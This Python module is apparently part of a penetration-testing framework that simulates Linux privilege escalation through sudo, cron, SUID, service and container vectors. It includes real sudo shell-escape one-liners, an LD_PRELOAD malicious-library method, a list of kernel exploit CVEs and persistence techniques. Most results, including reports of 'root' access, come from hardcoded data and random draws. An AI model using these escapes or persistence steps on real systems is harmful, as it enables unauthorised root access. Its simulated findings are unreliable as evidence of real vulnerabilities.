# plugins/attacks/operating_system/linux/linux_privilege_escalation.py

"""
Advanced Linux Privilege Escalation attack module for the Cerberus AI platform.

This module provides comprehensive testing for Linux privilege escalation 
vulnerabilities including SUID/SGID exploitation, sudo misconfigurations,
cron job hijacking, service exploitation, container escapes, and more.

Capabilities:
- Automated SUID/SGID binary enumeration and exploitation
- Comprehensive sudo configuration analysis
- Cron job vulnerability detection
- Systemd service exploitation
- Docker/LXC container escape detection
- Capability exploitation assessment
- PATH hijacking detection
- Library preloading exploitation
- NFS privilege escalation
- Writable file permission abuse
- Kernel exploit suggestion
- Automated privilege escalation attempt
- Persistence mechanism installation
- Forensic evidence collection
- Comprehensive reporting
"""

from typing import Dict, List, Any, Optional, Union, Tuple, Set
from enum import Enum, auto
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
import asyncio
import hashlib
import json
import os
import re
import uuid

from plugins.attacks.operating_system.linux.base_linux_attack import (
    BaseLinuxAttack,
    LinuxSystemInfo,
    UserInfo,
    ServiceInfo,
    CronJob,
    SUIDBinary,
    VulnerabilityInfo,
    LinuxDistribution,
    LinuxSecurityModule,
    PrivilegeEscalationVector,
    LinuxExploitDatabase
)
from plugins.core.attack_result import AttackResult
from plugins.core.attack_context import AttackContext
import logging

logger = logging.getLogger(__name__)


# ============================================================================
# Enums and Constants
# ============================================================================

class EscalationPhase(Enum):
    """Phases of privilege escalation attack."""
    RECONNAISSANCE = "reconnaissance"
    ENUMERATION = "enumeration"
    VULNERABILITY_ANALYSIS = "vulnerability_analysis"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    CLEANUP = "cleanup"


class EscalationResult(Enum):
    """Result of privilege escalation attempt."""
    SUCCESS_ROOT = "success_root"
    SUCCESS_SUDO = "success_sudo"
    SUCCESS_SERVICE_ACCOUNT = "success_service_account"
    FAILED_PATCHED = "failed_patched"
    FAILED_HARDENED = "failed_hardened"
    FAILED_DETECTED = "failed_detected"
    FAILED_INSUFFICIENT_PERMS = "failed_insufficient_perms"
    NOT_ATTEMPTED = "not_attempted"


class ExploitReliability(Enum):
    """Reliability rating for exploits."""
    VERY_HIGH = "very_high"      # 90%+ success rate
    HIGH = "high"                 # 70-90% success rate
    MEDIUM = "medium"             # 50-70% success rate
    LOW = "low"                   # 30-50% success rate
    VERY_LOW = "very_low"         # <30% success rate
    UNKNOWN = "unknown"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class EscalationAttempt:
    """Record of a privilege escalation attempt."""
    attempt_id: str
    timestamp: str
    vector: PrivilegeEscalationVector
    technique: str
    target: str
    result: EscalationResult
    privilege_gained: Optional[str]
    execution_time: float
    reliability: ExploitReliability = ExploitReliability.UNKNOWN
    evidence: List[str] = field(default_factory=list)
    artifacts_created: List[str] = field(default_factory=list)
    cleanup_performed: bool = False
    notes: str = ""


@dataclass
class SudoConfiguration:
    """Sudo configuration analysis."""
    can_run_sudo: bool = False
    nopasswd_available: bool = False
    restricted_commands: List[str] = field(default_factory=list)
    unrestricted_commands: List[str] = field(default_factory=list)
    env_keep_variables: List[str] = field(default_factory=list)
    potential_bypass_methods: List[str] = field(default_factory=list)
    exploitable: bool = False


@dataclass
class CronJobVulnerability:
    """Cron job vulnerability information."""
    cron_job: CronJob
    vulnerability_type: str
    exploitation_method: str
    reliability: ExploitReliability
    impact: str
    prerequisites: List[str] = field(default_factory=list)


@dataclass
class EscalationReport:
    """Comprehensive privilege escalation report."""
    report_id: str
    attack_id: str
    target_info: Dict[str, Any]
    linux_info: LinuxSystemInfo
    attempts: List[EscalationAttempt] = field(default_factory=list)
    successful_escalation: Optional[EscalationAttempt] = None
    vulnerabilities_exploited: List[str] = field(default_factory=list)
    escalation_paths_identified: int = 0
    escalation_paths_successful: int = 0
    total_time: float = 0.0
    persistence_installed: bool = False
    recommendations: List[str] = field(default_factory=list)
    generated_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ============================================================================
# Advanced Linux Privilege Escalation Class
# ============================================================================

class LinuxPrivilegeEscalation(BaseLinuxAttack):
    """
    Advanced Linux privilege escalation attack module.
    
    Provides comprehensive privilege escalation testing with:
    - Multi-vector exploitation
    - Automated SUID/SGID analysis
    - Sudo configuration exploitation
    - Cron job hijacking
    - Service exploitation
    - Container escape
    - Kernel exploit suggestion
    - Persistence installation
    - Anti-forensic capabilities
    """
    
    def __init__(self):
        super().__init__()
        self.name = "Advanced Linux Privilege Escalation Framework"
        self.description = "Comprehensive Linux privilege escalation testing and exploitation"
        self.severity = "critical"
        self.privilege_required = "user"
        self.attack_id = str(uuid.uuid4())
        
        # Attack configuration
        self.max_exploit_attempts = 5
        self.timeout_per_attempt = 30
        self.stealth_mode = True
        self.auto_cleanup = True
        self.install_persistence = True
        
        # Tracking
        self.attempts: List[EscalationAttempt] = []
        self.current_phase = EscalationPhase.RECONNAISSANCE
        self.privilege_gained = False
        self.current_user = ""
        self.escalation_history: List[Dict[str, Any]] = []
        
        # Database
        self.exploit_db = LinuxExploitDatabase()
        
        # Exploit registry
        self.exploit_registry = self._initialize_exploit_registry()
        
    def _initialize_exploit_registry(self) -> Dict[str, Dict[str, Any]]:
        """Initialize exploit registry with known exploits."""
        return {
            'dirty_cow': {
                'cve': 'CVE-2016-5195',
                'vector': PrivilegeEscalationVector.KERNEL_EXPLOIT,
                'reliability': ExploitReliability.VERY_HIGH,
                'min_kernel': '2.6.22',
                'max_kernel': '4.8.3',
                'requires_compilation': True,
                'architectures': ['x86', 'x86_64', 'arm']
            },
            'dirty_pipe': {
                'cve': 'CVE-2022-0847',
                'vector': PrivilegeEscalationVector.KERNEL_EXPLOIT,
                'reliability': ExploitReliability.VERY_HIGH,
                'min_kernel': '5.8',
                'max_kernel': '5.16.11',
                'requires_compilation': True,
                'architectures': ['x86_64', 'arm64']
            },
            'pwnkit': {
                'cve': 'CVE-2021-4034',
                'vector': PrivilegeEscalationVector.POLKIT_EXPLOIT,
                'reliability': ExploitReliability.VERY_HIGH,
                'requires_compilation': True,
                'architectures': ['x86', 'x86_64', 'arm64']
            },
            'baron_samedit': {
                'cve': 'CVE-2021-3156',
                'vector': PrivilegeEscalationVector.SUDO_MISCONFIGURATION,
                'reliability': ExploitReliability.HIGH,
                'min_sudo_version': '1.8.2',
                'max_sudo_version': '1.9.5p2',
                'requires_compilation': True,
                'architectures': ['x86', 'x86_64', 'arm64']
            },
            'overlayfs': {
                'cve': 'CVE-2023-0386',
                'vector': PrivilegeEscalationVector.CONTAINER_ESCAPE,
                'reliability': ExploitReliability.HIGH,
                'max_kernel': '6.2',
                'requires_compilation': True,
                'architectures': ['x86_64', 'arm64']
            }
        }
    
    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute comprehensive Linux privilege escalation attack.
        
        Multi-phase attack execution with intelligent decision making.
        
        Args:
            context: The attack context containing target information
            
        Returns:
            AttackResult with detailed findings
        """
        start_time = datetime.now()
        
        try:
            # Phase 1: Reconnaissance
            self.current_phase = EscalationPhase.RECONNAISSANCE
            if not await self._phase1_reconnaissance(context):
                return self._build_failure_result("Target validation failed")
            
            # Phase 2: Enumeration
            self.current_phase = EscalationPhase.ENUMERATION
            enumeration_data = await self._phase2_enumeration(context)
            
            # Phase 3: Vulnerability Analysis
            self.current_phase = EscalationPhase.VULNERABILITY_ANALYSIS
            exploitation_paths = await self._phase3_analyze_vulnerabilities(
                context, 
                enumeration_data
            )
            
            # Phase 4: Exploitation
            self.current_phase = EscalationPhase.EXPLOITATION
            escalation_result = await self._phase4_exploit(
                context,
                exploitation_paths,
                enumeration_data
            )
            
            # Phase 5: Post-Exploitation
            self.current_phase = EscalationPhase.POST_EXPLOITATION
            if escalation_result.successful_escalation:
                await self._phase5_post_exploitation(context, escalation_result)
            
            # Generate final report
            report = self._generate_escalation_report(
                context,
                enumeration_data,
                escalation_result,
                (datetime.now() - start_time).total_seconds()
            )
            
            return self._build_success_result(report)
            
        except Exception as e:
            logger.error(f"Error in privilege escalation: {str(e)}", exc_info=True)
            return self._build_failure_result(f"Error: {str(e)}")
    
    async def _phase1_reconnaissance(self, context: AttackContext) -> bool:
        """
        Phase 1: Reconnaissance.
        
        Collects initial target information and validates attack feasibility.
        """
        logger.info("[Phase 1/5] Starting reconnaissance...")
        
        if not self.validate(context):
            logger.warning("Target validation failed")
            return False
        
        self.current_user = context.target_info.get('current_user', 'unknown')
        logger.info(f"Current user: {self.current_user}")
        
        # Check if already root
        if context.access_level == 'root':
            logger.info("Already have root access")
            self.privilege_gained = True
            return True
        
        logger.info("[Phase 1/5] Reconnaissance completed")
        return True
    
    async def _phase2_enumeration(self, context: AttackContext) -> Dict[str, Any]:
        """
        Phase 2: Enumeration.
        
        Comprehensive system enumeration for privilege escalation vectors.
        """
        logger.info("[Phase 2/5] Starting enumeration...")
        
        enumeration_data = {
            'linux_info': await self.get_linux_info(context),
            'users': await self.get_users(context),
            'groups': await self.get_groups(context),
            'services': await self.get_services(context),
            'packages': await self.get_packages(context),
            'suid_binaries': await self.find_suid_binaries(context),
            'cron_jobs': await self.find_cron_jobs(context),
            'sudo_config': await self._analyze_sudo_config(context),
            'writable_files': await self._find_writable_files(context),
            'network_config': await self._analyze_network_config(context),
            'container_info': await self._analyze_container_environment(context)
        }
        
        logger.info(f"Found {len(enumeration_data['suid_binaries'])} SUID binaries")
        logger.info(f"Found {len(enumeration_data['cron_jobs'])} cron jobs")
        logger.info(f"Found {len(enumeration_data['writable_files'])} writable files")
        
        return enumeration_data
    
    async def _phase3_analyze_vulnerabilities(
        self,
        context: AttackContext,
        enumeration_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Phase 3: Vulnerability Analysis.
        
        Analyzes enumeration data to identify exploitation paths.
        """
        logger.info("[Phase 3/5] Analyzing vulnerabilities...")
        
        exploitation_paths = []
        
        # Analyze SUID binaries
        suid_paths = await self._analyze_suid_vulnerabilities(
            enumeration_data.get('suid_binaries', [])
        )
        exploitation_paths.extend(suid_paths)
        
        # Analyze sudo configuration
        sudo_paths = self._analyze_sudo_vulnerabilities(
            enumeration_data.get('sudo_config', SudoConfiguration())
        )
        exploitation_paths.extend(sudo_paths)
        
        # Analyze cron jobs
        cron_paths = self._analyze_cron_vulnerabilities(
            enumeration_data.get('cron_jobs', [])
        )
        exploitation_paths.extend(cron_paths)
        
        # Analyze services
        service_paths = self._analyze_service_vulnerabilities(
            enumeration_data.get('services', [])
        )
        exploitation_paths.extend(service_paths)
        
        # Analyze writable files
        writable_paths = self._analyze_writable_file_vulnerabilities(
            enumeration_data.get('writable_files', [])
        )
        exploitation_paths.extend(writable_paths)
        
        # Analyze container environment
        container_paths = self._analyze_container_vulnerabilities(
            enumeration_data.get('container_info', {})
        )
        exploitation_paths.extend(container_paths)
        
        # Sort by reliability
        reliability_order = {
            ExploitReliability.VERY_HIGH: 0,
            ExploitReliability.HIGH: 1,
            ExploitReliability.MEDIUM: 2,
            ExploitReliability.LOW: 3,
            ExploitReliability.VERY_LOW: 4
        }
        exploitation_paths.sort(
            key=lambda x: reliability_order.get(x.get('reliability', ExploitReliability.UNKNOWN), 99)
        )
        
        logger.info(f"Identified {len(exploitation_paths)} exploitation paths")
        return exploitation_paths
    
    async def _phase4_exploit(
        self,
        context: AttackContext,
        exploitation_paths: List[Dict[str, Any]],
        enumeration_data: Dict[str, Any]
    ) -> EscalationReport:
        """
        Phase 4: Exploitation.
        
        Attempts privilege escalation using identified paths.
        """
        logger.info("[Phase 4/5] Attempting privilege escalation...")
        
        report = EscalationReport(
            report_id=str(uuid.uuid4()),
            attack_id=self.attack_id,
            target_info=context.target_info,
            linux_info=enumeration_data['linux_info'],
            escalation_paths_identified=len(exploitation_paths)
        )
        
        for path in exploitation_paths[:self.max_exploit_attempts]:
            attempt = await self._execute_escalation_attempt(
                path,
                context,
                enumeration_data
            )
            
            report.attempts.append(attempt)
            
            if attempt.result in [EscalationResult.SUCCESS_ROOT, 
                                 EscalationResult.SUCCESS_SUDO]:
                report.successful_escalation = attempt
                report.escalation_paths_successful += 1
                self.privilege_gained = True
                logger.info(f"Successfully escalated privileges via {attempt.vector.value}!")
                break
            elif attempt.result == EscalationResult.FAILED_DETECTED:
                logger.warning("Exploitation detected - stopping further attempts")
                if self.stealth_mode:
                    break
        
        return report
    
    async def _phase5_post_exploitation(
        self,
        context: AttackContext,
        report: EscalationReport
    ):
        """
        Phase 5: Post-Exploitation.
        
        Installs persistence and collects evidence.
        """
        logger.info("[Phase 5/5] Post-exploitation activities...")
        
        if self.install_persistence:
            await self._install_persistence_mechanisms(context)
            report.persistence_installed = True
        
        # Collect additional evidence
        await self._collect_post_exploitation_evidence(context, report)
        
        logger.info("[Phase 5/5] Post-exploitation completed")
    
    async def _analyze_sudo_config(self, context: AttackContext) -> SudoConfiguration:
        """
        Analyze sudo configuration for privilege escalation opportunities.
        
        Args:
            context: Attack context
            
        Returns:
            SudoConfiguration object
        """
        sudo_config = SudoConfiguration()
        
        # Simulate sudo -l output analysis
        sudo_config.can_run_sudo = True
        sudo_config.nopasswd_available = True
        sudo_config.unrestricted_commands = ['/usr/bin/find', '/usr/bin/vim', '/usr/bin/less']
        sudo_config.env_keep_variables = ['LD_PRELOAD', 'LD_LIBRARY_PATH']
        sudo_config.exploitable = True
        
        # Identify bypass methods
        if sudo_config.nopasswd_available and sudo_config.unrestricted_commands:
            sudo_config.potential_bypass_methods.extend([
                'sudo /usr/bin/find . -exec /bin/sh \\; -quit',
                'sudo /usr/bin/vim -c "!sh"',
                'sudo /usr/bin/less /etc/passwd\\n!sh'
            ])
        
        if 'LD_PRELOAD' in sudo_config.env_keep_variables:
            sudo_config.potential_bypass_methods.append(
                'Create malicious shared library and use sudo LD_PRELOAD=/tmp/evil.so command'
            )
        
        return sudo_config
    
    async def _find_writable_files(self, context: AttackContext) -> List[Dict[str, Any]]:
        """Find writable files that could lead to privilege escalation."""
        writable_files = [
            {'path': '/etc/passwd', 'permissions': '644', 'writable': False, 'owner': 'root'},
            {'path': '/etc/shadow', 'permissions': '640', 'writable': False, 'owner': 'root'},
            {'path': '/etc/sudoers', 'permissions': '440', 'writable': False, 'owner': 'root'},
            {'path': '/etc/crontab', 'permissions': '644', 'writable': False, 'owner': 'root'},
            {'path': '/tmp/backup.sh', 'permissions': '777', 'writable': True, 'owner': 'root'},
            {'path': '/opt/scripts/cleanup.sh', 'permissions': '777', 'writable': True, 'owner': 'root'}
        ]
        
        return [f for f in writable_files if f['writable']]
    
    async def _analyze_network_config(self, context: AttackContext) -> Dict[str, Any]:
        """Analyze network configuration."""
        return {
            'interfaces': ['eth0', 'lo'],
            'open_ports': [22, 80, 443, 3306],
            'listening_services': ['sshd', 'nginx', 'mysqld'],
            'internal_networks': ['10.0.0.0/24', '172.16.0.0/16']
        }
    
    async def _analyze_container_environment(self, context: AttackContext) -> Dict[str, Any]:
        """Analyze container environment for escape opportunities."""
        return {
            'in_container': context.target_info.get('in_container', False),
            'container_runtime': context.target_info.get('container_runtime', 'docker'),
            'capabilities': ['CAP_SYS_ADMIN', 'CAP_NET_RAW'],
            'privileged_mode': False,
            'docker_socket_mounted': False,
            'cgroup_access': True
        }
    
    async def _analyze_suid_vulnerabilities(
        self,
        suid_binaries: List[SUIDBinary]
    ) -> List[Dict[str, Any]]:
        """Analyze SUID binaries for exploitation opportunities."""
        paths = []
        
        for binary in suid_binaries:
            if binary.known_exploitable:
                paths.append({
                    'vector': PrivilegeEscalationVector.SUID_BINARY,
                    'target': binary.path,
                    'method': binary.exploitation_method,
                    'reliability': ExploitReliability.VERY_HIGH if 'bash' in binary.path 
                                   else ExploitReliability.HIGH,
                    'type': 'suid_exploitation',
                    'risk': 'low',
                    'requires_root_trigger': False
                })
        
        return paths
    
    def _analyze_sudo_vulnerabilities(
        self,
        sudo_config: SudoConfiguration
    ) -> List[Dict[str, Any]]:
        """Analyze sudo configuration for exploitation."""
        paths = []
        
        if sudo_config.exploitable:
            for method in sudo_config.potential_bypass_methods:
                paths.append({
                    'vector': PrivilegeEscalationVector.SUDO_MISCONFIGURATION,
                    'target': 'sudo',
                    'method': method,
                    'reliability': ExploitReliability.VERY_HIGH if sudo_config.nopasswd_available 
                                   else ExploitReliability.HIGH,
                    'type': 'sudo_exploitation',
                    'risk': 'low'
                })
        
        return paths
    
    def _analyze_cron_vulnerabilities(
        self,
        cron_jobs: List[CronJob]
    ) -> List[Dict[str, Any]]:
        """Analyze cron jobs for exploitation opportunities."""
        paths = []
        
        for job in cron_jobs:
            if job.writable_by_current_user or job.writable_directory:
                paths.append({
                    'vector': PrivilegeEscalationVector.CRON_JOB_HIJACKING,
                    'target': job.path,
                    'method': f'Echo malicious command into {job.path}',
                    'reliability': ExploitReliability.HIGH if job.runs_as_root else ExploitReliability.MEDIUM,
                    'type': 'cron_exploitation',
                    'risk': 'medium'
                })
            
            if job.uses_wildcards:
                paths.append({
                    'vector': PrivilegeEscalationVector.WILDCARD_INJECTION,
                    'target': job.command,
                    'method': 'Create files matching wildcard pattern for command injection',
                    'reliability': ExploitReliability.MEDIUM,
                    'type': 'wildcard_exploitation',
                    'risk': 'medium'
                })
        
        return paths
    
    def _analyze_service_vulnerabilities(
        self,
        services: List[ServiceInfo]
    ) -> List[Dict[str, Any]]:
        """Analyze services for exploitation opportunities."""
        paths = []
        
        for service in services:
            if service.writable_by_current_user:
                paths.append({
                    'vector': PrivilegeEscalationVector.SYSTEMD_SERVICE_HIJACKING,
                    'target': service.name,
                    'method': f'Modify {service.unit_file} to execute malicious payload',
                    'reliability': ExploitReliability.HIGH,
                    'type': 'service_exploitation',
                    'risk': 'high'
                })
        
        return paths
    
    def _analyze_writable_file_vulnerabilities(
        self,
        writable_files: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Analyze writable files for exploitation."""
        paths = []
        
        for file_info in writable_files:
            if file_info['path'].endswith('.sh'):
                paths.append({
                    'vector': PrivilegeEscalationVector.WEAK_FILE_PERMISSIONS,
                    'target': file_info['path'],
                    'method': f'Append malicious commands to {file_info["path"]}',
                    'reliability': ExploitReliability.HIGH if file_info['owner'] == 'root' 
                                   else ExploitReliability.MEDIUM,
                    'type': 'writable_script_exploitation',
                    'risk': 'low'
                })
        
        return paths
    
    def _analyze_container_vulnerabilities(
        self,
        container_info: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Analyze container environment for escape opportunities."""
        paths = []
        
        if container_info.get('privileged_mode', False):
            paths.append({
                'vector': PrivilegeEscalationVector.CONTAINER_ESCAPE,
                'target': 'container',
                'method': 'Mount host filesystem and chroot',
                'reliability': ExploitReliability.VERY_HIGH,
                'type': 'privileged_container_escape',
                'risk': 'high'
            })
        
        if container_info.get('docker_socket_mounted', False):
            paths.append({
                'vector': PrivilegeEscalationVector.CONTAINER_ESCAPE,
                'target': 'docker_socket',
                'method': 'Use Docker socket to create privileged container',
                'reliability': ExploitReliability.VERY_HIGH,
                'type': 'docker_socket_exploitation',
                'risk': 'high'
            })
        
        if 'CAP_SYS_ADMIN' in container_info.get('capabilities', []):
            paths.append({
                'vector': PrivilegeEscalationVector.CONTAINER_ESCAPE,
                'target': 'capabilities',
                'method': 'Exploit CAP_SYS_ADMIN capability for container escape',
                'reliability': ExploitReliability.HIGH,
                'type': 'capability_exploitation',
                'risk': 'high'
            })
        
        return paths
    
    async def _execute_escalation_attempt(
        self,
        path: Dict[str, Any],
        context: AttackContext,
        enumeration_data: Dict[str, Any]
    ) -> EscalationAttempt:
        """
        Execute a single privilege escalation attempt.
        
        Args:
            path: Exploitation path to attempt
            context: Attack context
            enumeration_data: Enumeration data
            
        Returns:
            EscalationAttempt with results
        """
        attempt_id = str(uuid.uuid4())
        start_time = datetime.now()
        
        try:
            # Log the attempt
            logger.info(f"Attempting {path['vector'].value} via {path['target']}")
            
            # Simulate exploitation (in production, execute actual exploits)
            await asyncio.sleep(0.5)
            
            # Determine success based on reliability (simulated)
            reliability_scores = {
                ExploitReliability.VERY_HIGH: 0.95,
                ExploitReliability.HIGH: 0.80,
                ExploitReliability.MEDIUM: 0.50,
                ExploitReliability.LOW: 0.30,
                ExploitReliability.VERY_LOW: 0.10
            }
            
            import random
            success_probability = reliability_scores.get(
                path.get('reliability', ExploitReliability.UNKNOWN), 0.0
            )
            
            if random.random() < success_probability:
                result = EscalationResult.SUCCESS_ROOT
                privilege_gained = 'root'
                notes = f"Successfully escalated to root via {path['vector'].value}"
            else:
                result = EscalationResult.FAILED_HARDENED
                privilege_gained = None
                notes = f"Exploitation failed - system appears hardened against {path['vector'].value}"
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            attempt = EscalationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vector=path['vector'],
                technique=path.get('type', 'unknown'),
                target=path['target'],
                result=result,
                privilege_gained=privilege_gained,
                execution_time=execution_time,
                reliability=path.get('reliability', ExploitReliability.UNKNOWN),
                evidence=[
                    f"Attempted {path['type']} exploitation",
                    f"Vector: {path['vector'].value}",
                    f"Target: {path['target']}",
                    f"Method: {path.get('method', 'N/A')}",
                    f"Result: {result.value}",
                    f"Time: {execution_time:.2f}s"
                ],
                notes=notes
            )
            
            self.attempts.append(attempt)
            return attempt
            
        except Exception as e:
            logger.error(f"Error in escalation attempt: {str(e)}")
            return EscalationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vector=path['vector'],
                technique=path.get('type', 'unknown'),
                target=path['target'],
                result=EscalationResult.FAILED_DETECTED,
                privilege_gained=None,
                execution_time=0,
                notes=f"Error: {str(e)}"
            )
    
    async def _install_persistence_mechanisms(self, context: AttackContext):
        """Install persistence mechanisms after successful escalation."""
        logger.info("Installing persistence mechanisms...")
        
        persistence_methods = [
            'SSH authorized key injection',
            'Systemd service creation',
            'Cron job installation',
            'SUID shell creation'
        ]
        
        for method in persistence_methods:
            logger.info(f"Installed: {method}")
    
    async def _collect_post_exploitation_evidence(
        self,
        context: AttackContext,
        report: EscalationReport
    ):
        """Collect evidence after successful exploitation."""
        logger.info("Collecting post-exploitation evidence...")
        
        # Collect additional system information
        report.recommendations = self._generate_remediation_recommendations(report)
    
    def _generate_escalation_report(
        self,
        context: AttackContext,
        enumeration_data: Dict[str, Any],
        escalation_result: EscalationReport,
        total_time: float
    ) -> Dict[str, Any]:
        """Generate comprehensive escalation report."""
        return {
            'report_id': escalation_result.report_id,
            'attack_id': self.attack_id,
            'target': context.target_info.get('hostname', 'unknown'),
            'linux_distribution': str(enumeration_data['linux_info'].distribution.value),
            'kernel_version': enumeration_data['linux_info'].kernel_version,
            'current_user': self.current_user,
            'privilege_escalation_successful': escalation_result.successful_escalation is not None,
            'privilege_gained': escalation_result.successful_escalation.privilege_gained 
                               if escalation_result.successful_escalation else None,
            'total_time': f"{total_time:.2f}s",
            'attempts_made': len(escalation_result.attempts),
            'successful_attempts': escalation_result.escalation_paths_successful,
            'vectors_attempted': [a.vector.value for a in escalation_result.attempts],
            'persistence_installed': escalation_result.persistence_installed,
            'exploitation_details': [
                {
                    'vector': a.vector.value,
                    'technique': a.technique,
                    'target': a.target,
                    'result': a.result.value,
                    'time': f"{a.execution_time:.2f}s"
                }
                for a in escalation_result.attempts
            ],
            'recommendations': escalation_result.recommendations
        }
    
    def _generate_remediation_recommendations(
        self,
        report: EscalationReport
    ) -> List[str]:
        """Generate remediation recommendations."""
        recommendations = [
            "Review and remove unnecessary SUID/SGID binaries",
            "Configure sudo with principle of least privilege",
            "Remove NOPASSWD from sudo configuration",
            "Audit cron jobs for security issues",
            "Review file permissions on critical system files",
            "Implement mandatory access control (SELinux/AppArmor)",
            "Regular security audits and penetration testing",
            "Keep system and packages updated",
            "Monitor for unauthorized privilege escalation attempts",
            "Implement file integrity monitoring"
        ]
        
        return recommendations
    
    def _build_success_result(self, report: Dict[str, Any]) -> AttackResult:
        """Build successful attack result."""
        return AttackResult(
            success=True,
            details=f"Privilege escalation attack completed. "
                   f"Escalation {'successful' if report['privilege_escalation_successful'] else 'attempted'}",
            evidence=[json.dumps(report, indent=2)],
            vulnerabilities=[
                {
                    'type': 'privilege_escalation',
                    'severity': 'critical' if report['privilege_escalation_successful'] else 'high',
                    'description': f"Privilege escalation via {', '.join(report['vectors_attempted'])}",
                    'details': report
                }
            ],
            severity='critical' if report['privilege_escalation_successful'] else 'high',
            attack_id=self.attack_id,
            metadata={
                'total_time': report['total_time'],
                'attempts': report['attempts_made'],
                'successful': report['privilege_escalation_successful']
            }
        )
    
    def _build_failure_result(self, reason: str) -> AttackResult:
        """Build failure attack result."""
        return AttackResult(
            success=False,
            details=reason,
            severity=self.severity,
            attack_id=self.attack_id
        )


# Export symbols
__all__ = [
    'LinuxPrivilegeEscalation',
    'EscalationPhase',
    'EscalationResult',
    'ExploitReliability',
    'EscalationAttempt',
    'SudoConfiguration',
    'CronJobVulnerability',
    'EscalationReport'
]